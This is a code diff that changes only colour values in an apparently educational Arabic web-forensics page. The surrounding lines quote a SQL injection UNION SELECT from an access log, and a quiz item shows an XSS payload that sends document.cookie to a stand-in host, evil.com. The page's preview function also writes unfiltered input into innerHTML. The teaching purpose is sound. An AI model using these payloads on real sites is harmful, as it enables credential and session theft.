@@ -41,17 +41,17 @@ h2{color:#006633;margin-bottom:8px;font-size:1.2rem}
 .alert-orange{background:rgba(245,158,11,.1);border:1px solid rgba(245,158,11,.3);color:#c9a227}
 .btn{padding:9px 18px;border:none;border-radius:6px;font-size:.86rem;cursor:pointer;font-weight:600;transition:all .2s}
 .btn-orange{background:#f59e0b;color:#000}.btn-orange:hover{background:#d97706}
-.btn-red{background:#ff4444;color:#fff}.btn-green{background:#00ff88;color:#000}
+.btn-red{background:#b91c1c;color:#fff}.btn-green{background:#00ff88;color:#000}
 .btn-outline{background:transparent;border:1px solid #f59e0b;color:#c9a227}
 .btn-outline:hover{background:#f59e0b;color:#000}
 .btn-sm{padding:5px 12px;font-size:.78rem}
 input[type=text]{width:100%;background:#f0f7f3;border:1px solid #c8ddd2;border-radius:6px;padding:9px 12px;color:#1a2e22;font-size:.88rem;font-family:inherit}
 input:focus{outline:none;border-color:#c9a227}
 .code-block{background:#020a06;border:1px solid #c8ddd2;border-radius:8px;padding:14px;font-family:'Courier New',monospace;font-size:.8rem;line-height:1.8;overflow-x:auto}
-.kw{color:#c9a227}.str{color:#065f46}.comment{color:#4a7a5e}.danger{color:#ff4444;font-weight:bold}.safe{color:#006633}
+.kw{color:#c9a227}.str{color:#065f46}.comment{color:#4a7a5e}.danger{color:#b91c1c;font-weight:bold}.safe{color:#006633}
 .email-header{background:#020a06;border:1px solid #c8ddd2;border-radius:8px;padding:16px;font-family:'Courier New',monospace;font-size:.78rem;line-height:2}
 .eh-key{color:#c9a227;min-width:200px;display:inline-block}.eh-val{color:#4a7a5e}
-.eh-suspicious{color:#ff4444!important}.eh-ok{color:#065f46!important}
+.eh-suspicious{color:#b91c1c!important}.eh-ok{color:#065f46!important}
 .hop-row{display:flex;gap:12px;align-items:center;padding:8px 0;border-bottom:1px solid #c8ddd2;font-size:.82rem}
 .hop-num{width:24px;height:24px;border-radius:50%;background:#c8ddd2;display:flex;align-items:center;justify-content:center;font-size:.72rem;color:#c9a227;flex-shrink:0}
 .hop-ip{color:#006633;min-width:130px;font-family:monospace}
@@ -62,7 +62,7 @@ input:focus{outline:none;border-color:#c9a227}
 .options label{display:flex;align-items:center;gap:10px;padding:9px 12px;margin:5px 0;background:#f0f7f3;border:1px solid #c8ddd2;border-radius:6px;cursor:pointer;transition:all .2s;font-size:.88rem}
 .options label:hover{border-color:#c9a227}
 .options label.correct{border-color:#065f46;background:rgba(0,255,136,.08);color:#065f46}
-.options label.wrong{border-color:#ff4444;background:rgba(255,68,68,.08);color:#991b1b}
+.options label.wrong{border-color:#b91c1c;background:rgba(255,68,68,.08);color:#991b1b}
 .options input{accent-color:#c9a227}
 .xss-demo{background:#fff;border-radius:6px;padding:16px;color:#000;min-height:60px;font-size:.9rem}
 .xss-safe{background:#e8f5e9;color:#1b5e20;padding:12px;border-radius:6px;font-size:.9rem}
@@ -75,7 +75,7 @@ input:focus{outline:none;border-color:#c9a227}
 .session-table{width:100%;border-collapse:collapse;font-size:.82rem}
 .session-table th{background:#1a0d00;color:#c9a227;padding:8px;border-bottom:2px solid #2d2d00;text-align:right}
 .session-table td{padding:8px;border-bottom:1px solid #c8ddd2;font-family:monospace;font-size:.78rem}
-.stolen{color:#ff4444!important;background:rgba(255,68,68,.05)}
+.stolen{color:#b91c1c!important;background:rgba(255,68,68,.05)}
 .site-topbar{background:#004d28;border-bottom:1px solid #003d20;padding:6px 24px;display:flex;align-items:center;justify-content:space-between;font-size:.72rem;color:#d4e8db;flex-wrap:wrap;gap:6px}
 .site-topbar .author-tag{color:#c9a227;font-weight:700}
 .site-header-bar{background:linear-gradient(135deg,#006633 0%,#00843d 60%,#004d28 100%);border-bottom:4px solid #c9a227;padding:14px 24px;display:flex;align-items:center;gap:16px;flex-wrap:wrap}
@@ -189,7 +189,7 @@ input:focus{outline:none;border-color:#c9a227}
       <div class="prompt">analyst@forensics:~$ <span class="cmd">grep -i "union\|select\|'\s*or\s*'\|--" /var/log/apache2/access.log</span></div>
       <div class="out">192.168.1.105 - - [20/Mar/2024:14:22:31] "GET /login.php?id=1' HTTP/1.1" 500
 192.168.1.105 - - [20/Mar/2024:14:22:45] "GET /login.php?id=1+UNION+SELECT+null,username,password+FROM+users--" HTTP/1.1" 200
-192.168.1.105 - - [20/Mar/2024:14:23:01] "POST /login.php" 200 <span style="color:#ff4444">← تسجيل دخول ناجح بعد 47 محاولة!</span></div>
+192.168.1.105 - - [20/Mar/2024:14:23:01] "POST /login.php" 200 <span style="color:#b91c1c">← تسجيل دخول ناجح بعد 47 محاولة!</span></div>
     </div>
     <div class="quiz-box">
       <h4>❓ ما الوسيلة الأساسية للحماية من SQL Injection؟</h4>
@@ -219,7 +219,7 @@ input:focus{outline:none;border-color:#c9a227}
         <div class="browser-dot" style="background:#febc2e"></div>
         <div class="browser-dot" style="background:#28c840"></div>
         <input class="url-bar" id="xss-url" value="https://vulnerable-shop.com/search?q=" readonly style="flex:0 0 auto;width:350px">
-        <span id="xss-url-param" style="color:#ff4444;font-family:monospace;font-size:.8rem"></span>
+        <span id="xss-url-param" style="color:#b91c1c;font-family:monospace;font-size:.8rem"></span>
       </div>
       <div class="browser-body">
         <div style="color:#c8ddd2;font-size:.9rem;margin-bottom:8px">نتائج البحث عن: <strong id="xss-display" style="color:#333"></strong></div>
@@ -254,7 +254,7 @@ input:focus{outline:none;border-color:#c9a227}
     <h3>🛡️ الحماية والكشف الجنائي</h3>
     <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px">
       <div>
-        <div style="color:#ff4444;font-size:.85rem;margin-bottom:8px">❌ كود خطير:</div>
+        <div style="color:#b91c1c;font-size:.85rem;margin-bottom:8px">❌ كود خطير:</div>
         <div class="code-block"><span class="comment">// PHP — ضعيف</span>
 echo $_GET['q'];
 
@@ -271,7 +271,7 @@ div.textContent = userInput;</div>
       </div>
     </div>
     <div class="quiz-box">
-      <h4>❓ المحقق يرى في السجل: <code style="color:#ff4444">GET /search?q=&lt;script&gt;fetch('evil.com?c='+document.cookie)&lt;/script&gt;</code> — ماذا حدث؟</h4>
+      <h4>❓ المحقق يرى في السجل: <code style="color:#b91c1c">GET /search?q=&lt;script&gt;fetch('evil.com?c='+document.cookie)&lt;/script&gt;</code> — ماذا حدث؟</h4>
       <div class="options" id="q-xss">
         <label><input type="radio" name="q-xss" value="a"> المستخدم يبحث عن كود JavaScript</label>
         <label><input type="radio" name="q-xss" value="b"> هجوم Reflected XSS لسرقة الـ Cookie وإرسالها لخادم المهاجم</label>
@@ -321,12 +321,12 @@ div.textContent = userInput;</div>
       </tr>
       <tr class="stolen">
         <td>user_session</td><td style="color:#991b1b">eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.</td><td>target-app.com</td>
-        <td><span style="color:#ff4444">❌</span></td><td><span style="color:#ff4444">❌</span></td>
+        <td><span style="color:#b91c1c">❌</span></td><td><span style="color:#b91c1c">❌</span></td>
         <td><span class="badge badge-red">⚠️ خطر</span></td>
       </tr>
       <tr>
         <td>remember_me</td><td style="color:#4a7a5e">3f8a...hash...</td><td>forum.net</td>
-        <td><span style="color:#065f46">✅</span></td><td><span style="color:#ff4444">❌</span></td>
+        <td><span style="color:#065f46">✅</span></td><td><span style="color:#b91c1c">❌</span></td>
         <td><span class="badge badge-orange">تحقق</span></td>
       </tr>
     </table>
@@ -392,8 +392,8 @@ div.textContent = userInput;</div>
     </div>
     <div class="hop-row">
       <div class="hop-num">2</div>
-      <div class="hop-ip" style="color:#ff4444">185.220.101.77</div>
-      <div class="hop-loc">🧅 <strong style="color:#ff4444">Tor Exit Node — روسيا</strong></div>
+      <div class="hop-ip" style="color:#b91c1c">185.220.101.77</div>
+      <div class="hop-loc">🧅 <strong style="color:#b91c1c">Tor Exit Node — روسيا</strong></div>
       <div class="hop-time">09:15:31</div>
     </div>
     <div class="hop-row">
@@ -608,7 +608,7 @@ function previewXSS(){
   const out=document.getElementById('xss-output');
   const safe=document.getElementById('xss-safe-output');
   if(val.toLowerCase().includes('<script')||val.toLowerCase().includes('onerror')||val.toLowerCase().includes('onload')){
-    out.innerHTML=`<div style="background:#ff000020;border:2px solid #ff4444;padding:10px;border-radius:6px;color:#ff4444">⚠️ في موقع حقيقي هنا كان سيُنفَّذ: <code>${val.replace(/</g,'&lt;')}</code><br>المهاجم يستطيع سرقة كل الـ Cookies أو إعادة التوجيه!</div>`;
+    out.innerHTML=`<div style="background:#ff000020;border:2px solid #ff4444;padding:10px;border-radius:6px;color:#b91c1c">⚠️ في موقع حقيقي هنا كان سيُنفَّذ: <code>${val.replace(/</g,'&lt;')}</code><br>المهاجم يستطيع سرقة كل الـ Cookies أو إعادة التوجيه!</div>`;
     safe.innerHTML=`<div class="alert alert-success">🛡️ النسخة الآمنة (بعد htmlspecialchars): يظهر النص <code>${val.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;')}</code> كنص عادي</div>`;
   } else {
     out.innerHTML=`<div style="color:#333">نتيجة البحث عن: <strong>${val}</strong></div>`;
@@ -700,6 +700,7 @@ function computeXOR_sym(){}
 </div>
 </body>
 </html>
+
 
 
 
